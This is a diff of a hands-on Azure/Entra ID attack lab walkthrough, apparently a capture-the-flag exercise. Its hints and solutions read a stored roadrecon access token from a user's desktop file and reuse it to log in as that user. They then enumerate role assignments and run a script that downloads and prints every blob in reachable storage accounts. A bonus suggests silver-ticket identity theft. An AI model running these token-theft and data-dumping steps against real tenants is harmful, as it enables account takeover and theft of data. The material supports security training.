@@ -136,10 +136,10 @@ Set-AADIntUserPassword -SourceAnchor "IMMUTABLE_ID" -Password "MYPASS" -Verbose
 <details>
 <summary><b>Solution</b></summary>
 
-user1 uses roadrecon to map attack surfaces in his company's attack surface, the script is executed on a regular basis.
-as we learned, roadrecon writes a file with the access token called "", we can take that access token and steal it!
+    user1 uses roadrecon to map attack surfaces in his company's attack surface, the script is executed on a regular basis.
+    as we learned, roadrecon writes a file with the access token called "", we can take that access token and steal it!
 
-Run the following command on the Win11 VM from the Run Command Window in the Azure portal:
+    Run the following command on the Win11 VM from the Run Command Window in the Azure portal:
 
 ```powershell
 type c:\users\user1.YOURDOMAIN\desktop\.roadtools_auth
@@ -159,62 +159,80 @@ type c:\users\user1.YOURDOMAIN\desktop\.roadtools_auth
     
     Recon as that user and see what he has access to..
 
-    ```powershell
-    $at = "eyJ"... # what you've obtained from the Run Command hack
-    $userUPN = "user2@YOURDOMAIN.onmicrosoft.com" # you can get it from the access token if you'll parse in https://jwt.io
+```powershell
+$at = "eyJ"... # what you've obtained from the Run Command hack
+$userUPN = "user2@YOURDOMAIN.onmicrosoft.com" # you can get it from the access token if you'll parse in https://jwt.io
+$tenantId = "YOUR_TENANT_ID" # you can get it here https://entra.microsoft.com/#view/Microsoft_AAD_IAM/TenantOverview.ReactView
 
 
-    $tenantId = "YOUR_TENANT_ID" # you can get it here https://entra.microsoft.com/#view/Microsoft_AAD_IAM/TenantOverview.ReactView
-    Connect-AzureAD -AccountId  $userUPN  -TenantId $tenantId -AadAccessToken $at
-    Connect-AzAccount -AccountId  $userUPN  -TenantId $tenantId -AccessToken $at 
-
-    ```
+Connect-AzureAD -AccountId  $userUPN -TenantId $tenantId -AadAccessToken $at
+Connect-AzAccount -AccountId  $userUPN -TenantId $tenantId -AccessToken $at 
+```
 </details>
 
 <details>
     <summary><b>Hint 2</b></summary>
     
-    ```powershell
-    # List current user's Azure Role Assignments using Azure PowerShell
+```powershell
+# List current user's Azure Role Assignments using Azure PowerShell
 
-    $userObjectId = "686ebf9d-25..." # get it by parsing the JWT token and looking for the 'oid' field
-    $roleAssignments = Get-AzRoleAssignment -ObjectId $userObjectId
-    $roleAssignments | ForEach-Object {
-        Write-Output "Role: $($_.RoleDefinitionName) - Scope: $($_.Scope)"
-    }
-
-    
-    ```
+$userObjectId = "686ebf9d-25..." # get it by parsing the JWT token and looking for the 'oid' field
+$roleAssignments = Get-AzRoleAssignment -ObjectId $userObjectId
+$roleAssignments | ForEach-Object {
+    Write-Output "Role: $($_.RoleDefinitionName) - Scope: $($_.Scope)"
+}
+```
 </details>
 
 <details>
     <summary><b>Hint 3</b></summary>
     
-    ```powershell
-    # we can see that there's a storage account that this user has access to..
-
-    $userObjectId = "686ebf9d-25..." # get it by parsing the JWT token and looking for the 'oid' field
-    $roleAssignments = Get-AzRoleAssignment -ObjectId $userObjectId
-    $roleAssignments | ForEach-Object {
-        Write-Output "Role: $($_.RoleDefinitionName) - Scope: $($_.Scope)"
-    }
-
-    # we can see that there's a storage account that this user has access to..
-    ```
+    We can see that there's a storage account that this user has access to..
 </details>
 
 
-### Step 3 Solution
-
+<details>
+    <summary><b>Solution</b></summary>
+    
 ```powershell
-$at = "eyJ...."
-$secureAt = ConvertTo-SecureString -String $at -AsPlainText -Force
-Connect-MgGraph -AccessToken $secureAt
-Get-MgUser
+# Get all storage accounts
+$storageAccounts = Get-AzStorageAccount
+
+foreach ($storageAccount in $storageAccounts) {
+    Write-Output "Storage Account: $($storageAccount.StorageAccountName)"
+
+    # Get the context for the storage account
+    $context = $storageAccount.Context
+
+    # List all containers in the storage account
+    $containers = Get-AzStorageContainer -Context $context
+
+    foreach ($container in $containers) {
+        Write-Output "  Container: $($container.Name)"
+
+        # List all blobs in the container
+        $blobs = Get-AzStorageBlob -Container $container.Name -Context $context
+
+        foreach ($blob in $blobs) {
+            Write-Output "    Blob: $($blob.Name)"
+
+            # Download the blob content to a temporary location
+            $tempFilePath = Join-Path -Path $env:TEMP -ChildPath $blob.Name
+            Get-AzStorageBlobContent -Blob $blob.Name -Container $container.Name -Context $context -Destination $tempFilePath -Force
+
+            # Print the content of the blob
+            $blobContent = Get-Content -Path $tempFilePath
+            Write-Output "      Content: $blobContent"
+        }
+    }
+}
 ```
 
-### Bonus: 
-Go back to the beginning, and try steal user2 using silver ticket (Seamless SSO) instead of password reset
+### The content of "secret.txt" in storage account is your medal, mazal tov hacker cracker!
+
+#### Bonus: 
+Go back to the beginning, and try steal user1 identity using silver ticket (Seamless SSO) instead of password reset
+</details>
 
 
 ## Don't forget
